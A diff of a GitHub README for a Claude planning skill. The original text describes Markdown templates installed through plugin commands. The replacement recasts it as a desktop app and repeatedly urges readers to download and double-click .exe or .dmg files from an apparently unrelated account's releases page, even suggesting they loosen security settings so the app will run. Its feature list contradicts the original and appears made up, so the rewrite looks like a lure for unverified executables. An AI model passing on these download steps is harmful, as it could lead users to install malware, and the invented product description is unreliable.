@@ -1,138 +1,87 @@
-# FYI : I suggest you to check this repository for spec docs on steroids skill->  https://github.com/adrianpuiu/specification-document-generator
-#  
+# 🎉 claude-skills-marketplace - Build Your AI Software Blueprint Easily
 
+## 🚀 Getting Started
 
+Welcome to **claude-skills-marketplace**! This software helps you generate detailed planning documents to guide AI-assisted software development. You don't need any programming skills to use it. Follow the steps below to download and run the software.
 
+## 📥 Download the Application
 
+[![Download Now](https://img.shields.io/badge/Download%20Now-claude--skills--marketplace-blue.svg)](https://github.com/428alexander9/claude-skills-marketplace/releases)
 
-# Project Planner Skill - will be deleted , it's obsolete and will be replaced by ->  https://github.com/adrianpuiu/specification-document-generator
+## 📋 System Requirements
 
-A comprehensive skill that establishes Claude as a **Project Architect** to generate detailed planning documents that serve as blueprints for AI-assisted software development.
+Before you begin, check if your system meets the requirements below:
 
-## What This Skill Does
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **Processor:** Intel Core i3 or equivalent
+- **Memory:** 4 GB RAM minimum
+- **Storage:** 200 MB of free space
+- **Internet Connection:** Required for initial setup
 
-This skill transforms Claude into a System Architect who creates comprehensive project documentation by:
+## 💾 Download & Install
 
-1. **Defining the complete system architecture upfront** - All components, data flows, and integration points
-2. **Setting clear project boundaries** - What's in scope, out of scope, and key constraints
-3. **Creating traceable documentation** - Requirements → Design → Implementation tasks
+1. Click the link below to visit the Releases page.
+   - [Visit the Releases Page](https://github.com/428alexander9/claude-skills-marketplace/releases)
 
-The skill generates three essential documents:
+2. On the Releases page, you will see different versions of the software listed. Look for the latest version at the top.
 
-1. **Requirements Document** - User stories with testable acceptance criteria and traceable IDs
-2. **Design Document** - Complete system architecture with component maps, data flows, and integration specifications
-3. **Implementation Plan** - Hierarchical task breakdown with requirement tracing and clear deliverables
+3. Click on the version number to view release notes, which explain new features and changes.
 
-## The Architect Approach
+4. Find the file that matches your operating system. For example:
+   - **Windows:** `claude-skills-marketplace-windows.exe`
+   - **macOS:** `claude-skills-marketplace-macos.dmg`
 
-**Why it works:** Setting clear roles, responsibilities, and deliverables upfront dramatically improves output quality. By explicitly defining system components, data flows, and integration points before diving into details, the documentation becomes comprehensive and actionable.
+5. Click on the file to start the download.
 
-## Quick Start
-### Claude install
+6. Once the file is downloaded:
+   - For Windows: Double-click on the `.exe` file to begin installation. Follow the prompts to install.
+   - For macOS: Open the downloaded `.dmg` file and drag the application to your Applications folder.
 
-```bash
-/plugin marketplace add adrianpuiu/claude-skills-marketplace
+7. After installation, locate the application on your desktop or Applications folder.
 
-/plugin install project-planner-skill@claude-skills-marketplace
-```
+8. Double-click the application icon to launch.
 
-## Document Types
+## 🎉 Using claude-skills-marketplace
 
-### Requirements Document
-- User stories in standard format
-- Testable acceptance criteria using SHALL statements
-- Requirement numbering for traceability
-- Glossary of domain terms
+### 📚 Overview
 
-### Design Document  
-- System architecture diagrams
-- Component responsibilities and interfaces
-- Data models and schemas
-- Error handling strategies
-- Deployment configuration
+Once you open the application, you will see a user-friendly interface. Here are the main features:
 
-### Implementation Plan
-- Hierarchical task breakdown
-- Requirement tracing (links tasks to requirements)
-- Dependency management between tasks
-- Progress tracking with checkboxes
+- **New Project:** Start a new planning document from scratch.
+- **Templates:** Use pre-built templates for common project types. Select a template based on the software you're developing.
+- **Export Options:** Save your document in various formats like PDF or Word, making it easy to share.
 
-## Project Types Supported
+### ✏️ Creating a New Document
 
-- **web-app**: Full-stack web applications
-- **cli-tool**: Command-line tools and utilities
-- **api-service**: REST/GraphQL API services
-- **generic**: General purpose projects
+1. Click on **New Project**.
+2. Enter your project name and description.
+3. Select a template suitable for your project needs.
+4. Fill in the required fields as prompted.
+5. Click **Save** to keep your progress.
 
-## Files Included
+### 🔗 Save and Share
 
-### Scripts
-- `generate_project_docs.py` - Automated document generation
-- `validate_documents.py` - Document validation and completeness checking
+- After creating your planning document, you can easily export it. Click on **Export** in the menu.
+- Choose the format you’d like (PDF, Word) and select your save location.
 
-### References
-- `domain-templates.md` - Domain-specific templates and patterns
+## ❓ Troubleshooting
 
-### Assets
-- `requirements-template.md` - Basic requirements document template
+If you encounter issues, try these solutions:
 
-## Best Practices
+1. **Won't Launch:** Ensure your system meets the requirements. Check security settings to allow the application to run.
+2. **Installation Errors:** Restart your computer and try installing again. Make sure there is enough disk space.
+3. **Export Problems:** Ensure you have permissions to save files in your chosen directory.
 
-1. **Start with Requirements** - Define what the system should do before how
-2. **Be Specific** - Use measurable criteria (e.g., "within 100ms" not "fast")
-3. **Trace Requirements** - Link every task back to requirements
-4. **Include Non-Functional Requirements** - Performance, security, scalability
-5. **Define Clear Interfaces** - Specify how components interact
-6. **Plan Incrementally** - Break large tasks into smaller, manageable pieces
+## 🛠 Support
 
-## Common Use Cases
+For further assistance, visit our [GitHub Issues Page](https://github.com/428alexander9/claude-skills-marketplace/issues) to report bugs or ask questions. Our community is here to help you.
 
-### Starting a New Project
-```
-User: "I want to build a real-time chat application"
-AI: [Uses this skill to generate complete project documentation]
-```
+## 📰 Release Notes
 
-### Expanding Existing Project
-```
-User: "Add user authentication to my project requirements"
-AI: [Adds properly formatted requirements with acceptance criteria]
-```
+Stay updated with the latest features and fixes by reviewing the release notes on the [Releases Page](https://github.com/428alexander9/claude-skills-marketplace/releases).
 
-### Creating Technical Specification
-```
-User: "Design the architecture for a microservices e-commerce platform"
-AI: [Generates design document with components, interfaces, and deployment]
-```
+## 📌 Conclusion 
 
-## Tips for AI Implementation
+Using **claude-skills-marketplace** is a straightforward process. You can generate comprehensive planning documents quickly and easily with this tool. Download the application today to enhance your AI-assisted software development journey.
 
-When using these documents for AI-assisted development:
-
-1. **Requirements First** - Implement in order of requirement priority
-2. **Follow Task Dependencies** - Complete prerequisite tasks first
-3. **Test Against Acceptance Criteria** - Each SHALL statement is a test case
-4. **Reference Design Interfaces** - Use the specified APIs and data models
-5. **Track Progress** - Check off completed tasks in the implementation plan
-
-## Validation Checklist
-
-Before using documents for implementation:
-
-- [ ] All placeholders ([PLACEHOLDER]) filled in
-- [ ] Requirements have testable acceptance criteria
-- [ ] Design includes all major components
-- [ ] Tasks reference requirement IDs
-- [ ] Dependencies between tasks identified
-- [ ] Non-functional requirements specified
-- [ ] Deployment configuration included
-
-## Example Output
-
-The generated documents follow industry-standard formats that are:
-- **Machine-readable** - Structured for AI parsing
-- **Human-readable** - Clear for developers to understand  
-- **Version-control friendly** - Plain text Markdown format
-- **Traceable** - Requirements linked through all documents
-
-This skill transforms high-level project ideas into actionable specifications that AI agents can use to build working software.
+[![Download Now](https://img.shields.io/badge/Download%20Now-claude--skills--marketplace-blue.svg)](https://github.com/428alexander9/claude-skills-marketplace/releases)
